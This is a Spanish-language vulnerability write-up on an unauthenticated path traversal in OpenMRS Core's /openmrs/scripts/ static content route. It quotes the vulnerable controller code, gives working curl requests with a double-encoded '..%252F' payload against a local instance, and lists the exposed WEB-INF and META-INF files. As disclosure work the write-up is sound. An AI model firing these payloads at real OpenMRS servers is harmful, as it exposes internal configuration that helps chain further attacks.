Static content path traversal_

HighPath traversal / File disclosureNo response
OpenMRSPath TraversalFile DisclosureSpring MVC

Alcance: la validación se realizó contra OpenMRS Core en un despliegue Docker Compose local. El hallazgo fue reportado previamente mediante GitHub Security Advisory como GHSA-qp2w-pqvj-4g33 y posteriormente seguido por email. El maintainer no respondió y no se asignó CVE.

Durante la revisión de OpenMRS Core encontré una vulnerabilidad de path traversal no autenticada en el dispatcher de contenido estático. El fallo permitía a un atacante remoto leer archivos internos empaquetados dentro del archivo WAR de la aplicación web.

El problema afectaba a la ruta /openmrs/scripts/*. Mediante secuencias de traversal doblemente codificadas era posible escapar del directorio previsto para scripts y recuperar archivos como /WEB-INF/web.xml, /WEB-INF/openmrs_static_content-servlet.xml, /WEB-INF/csrfguard.properties y /META-INF/context.xml.

El impacto confirmado se limita a divulgación de archivos internos de la aplicación web. No confirmé lectura arbitraria del filesystem del sistema operativo, escritura de archivos, bypass de autenticación ni ejecución remota de código.

Flujo vulnerable

La ruta /scripts/* estaba mapeada al servlet openmrs_static_content en:

webapp/src/main/webapp/WEB-INF/web.xml

El servlet estaba configurado para enviar las solicitudes a staticResourceDispatcher mediante:

webapp/src/main/webapp/WEB-INF/openmrs_static_content-servlet.xml

El mismo contexto de servlet utilizaba un InternalResourceViewResolver con /WEB-INF/view como ruta base y un sufijo vacío. El path de la solicitud terminaba siendo procesado por:

web/src/main/java/org/openmrs/web/controller/PseudoStaticContentController.java
String path = request.getServletPath() + request.getPathInfo();

if (rewrites != null && rewrites.containsKey(path)) {
    path = rewrites.get(path);
}
if (interpretJstl) {
    path += ".withjstl";
}

return new ModelAndView(path);

El path controlado por la solicitud se devolvía como ModelAndView sin canonicalización ni validación que garantizara que el recurso final permaneciera bajo /WEB-INF/view/scripts/.

Double URL encoding

Una solicitud como la siguiente utilizaba dos niveles de codificación para que la secuencia de traversal sobreviviera al primer procesamiento:

/openmrs/scripts/..%252F..%252Fweb.xml

La ruta terminaba resolviéndose como un recurso interno equivalente a:

/WEB-INF/view/scripts/../../web.xml

El resultado era la lectura de:

/WEB-INF/web.xml

El mismo comportamiento permitía alcanzar otros recursos del WAR bajo /WEB-INF y /META-INF.

Prueba de concepto local

La prueba se realizó contra OpenMRS Core en la configuración Docker Compose del proyecto. No se requirió autenticación.

1. Lectura de web.xml

curl --path-as-is -i \
  'http://localhost:8080/openmrs/scripts/..%252F..%252Fweb.xml'

La respuesta observada fue:

HTTP/1.1 200
Content-Type: application/xml;charset=UTF-8
Content-Length: 12880

El body contenía el descriptor interno de la aplicación web:

<web-app xmlns="https://jakarta.ee/xml/ns/jakartaee" ...>
    <display-name>OpenMRS</display-name>
    <description>An Open-Source EMR System</description>
    ...
</web-app>

Resultado: el payload doblemente codificado devolvía HTTP 200 y exponía el archivo interno /WEB-INF/web.xml.

2. Lectura de configuración de CSRFGuard

curl --path-as-is -i \
  'http://localhost:8080/openmrs/scripts/..%252F..%252Fcsrfguard.properties'

La respuesta observada fue:

HTTP/1.1 200
Content-Length: 34113

El contenido devuelto correspondía al archivo interno /WEB-INF/csrfguard.properties, confirmando que la exposición no estaba limitada a un único descriptor.

Archivos confirmados

  • /WEB-INF/web.xml
  • /WEB-INF/openmrs_static_content-servlet.xml
  • /WEB-INF/csrfguard.properties
  • /WEB-INF/csrfguard.js
  • /META-INF/context.xml
  • /META-INF/MANIFEST.MF

Impacto

Un atacante remoto no autenticado podía leer archivos internos del archivo WAR desplegado. Estos archivos exponían detalles de la estructura de la aplicación y de sus controles de seguridad:

  • Mapeos de servlets y filtros.
  • Configuración de Spring MVC.
  • Configuración de CSRFGuard.
  • Configuración del contexto de Tomcat.
  • Rutas internas y metadatos de build y versión.

La información puede ayudar a comprender la arquitectura interna y facilitar el encadenamiento con otras vulnerabilidades. En esta investigación no confirmé lectura arbitraria de archivos del sistema, escritura, bypass de autenticación ni RCE.

Divulgación responsable

El problema fue reportado previamente mediante GitHub Security Advisory con el identificador GHSA-qp2w-pqvj-4g33. Posteriormente envié un seguimiento por email al equipo de seguridad de OpenMRS por si el advisory había sido omitido o requería información adicional.

Estado

El maintainer no respondió y no se asignó CVE. Esta investigación se publica con datos sintéticos y documenta únicamente una instancia de prueba controlada.
